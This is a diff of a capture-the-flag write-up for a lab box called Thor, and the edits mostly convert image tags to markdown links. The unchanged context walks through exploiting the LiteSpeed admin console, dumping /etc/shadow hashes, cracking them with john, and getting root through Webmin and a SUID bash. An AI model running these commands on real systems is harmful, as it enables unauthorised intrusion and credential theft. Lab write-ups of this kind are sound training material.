@@ -144,17 +144,17 @@ PORT      STATE SERVICE       VERSION
 
 Port 80 hosted a portfolio page for Jane Foster:
 
-<figure><img src="../../../.gitbook/assets/image (1541).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1541).png>)
 
 At the bottom of the page, there was some contact details:
 
-<figure><img src="../../../.gitbook/assets/image (1539).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1539).png>)
 
 The box was named Thor, so it makes sense that there would be something 'Thor' related. From the earlier `nmap` scan, we know that port 80 is running using Litespeed. Port 7080 is the LiteSpeed admin console, likely operated by this Jane Foster.
 
 Port 7080 reveals a login page:
 
-<figure><img src="../../../.gitbook/assets/image (3175).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3175).png>)
 
 There are some exploits available for this:
 
@@ -211,7 +211,7 @@ $ python3 49556.py 192.168.201.208:7080 admin Foster2020 shadow
 [+] Triggering command execution..
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3147).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3147).png>)
 
 ## Privilege Escalation
 
@@ -219,13 +219,11 @@ $ python3 49556.py 192.168.201.208:7080 admin Foster2020 shadow
 
 We are part of the `shadow` group, meaning we can read `/etc/shadow`:
 
-{% code overflow="wrap" %}
 ```
 $ cat /etc/shadow
 root:$6$XRJJB9j7GYzWvjBy$yZEsOS3cam1DG.eI26bW1TERw5SV7b3RVZQHZB7UFzKNyPR6PPUFfxzclKsiGUT8.WoL7vQ4hhNmekav68kwN1:19150:0:99999:7:::
 thor:$6$l2ThCEsvmrzmkKIA$FWtAb1SsYFqAXA96Ze4uGTHtPV9HNi7ShAgoTet1gx.HvkEFePp.Bk/uBeuxpCMz/X3jXWbGavj11po9H/FzP.:19150:0:99999:7:::
 ```
-{% endcode %}
 
 We can try to crack the hashes alone using `john` for these users. The hash for `thor` can be cracked while the one for `root` cannot.
 
@@ -238,7 +236,7 @@ $ john --show hashes
 
 We can then `ssh` in as `thor`:
 
-<figure><img src="../../../.gitbook/assets/image (1066).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1066).png>)
 
 ### Sudo Webmin -> Webmin RCE
 
@@ -291,7 +289,7 @@ $ python3 49556.py 192.168.201.208:7080 admin Foster2020 bin
 [+] Triggering command execution...
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3087).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3087).png>)
 
 Then we can reset the password and restart Webmin as `thor`:
 
@@ -305,12 +303,12 @@ thor@Lite:~$ sudo /usr/bin/systemctl restart webmin
 
 Using this, we can login to Webmin and view the dashboard:
 
-<figure><img src="../../../.gitbook/assets/image (1544).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1544).png>)
 
 Within Webmin, there's a `>_` option, which spawns a command line instance within the browser:
 
-<figure><img src="../../../.gitbook/assets/image (2072).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2072).png>)
 
 We can just do `chmod u+s /bin/bash`, and get a proper `root` shell using `ssh`.
 
-<figure><img src="../../../.gitbook/assets/image (3086).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3086).png>)
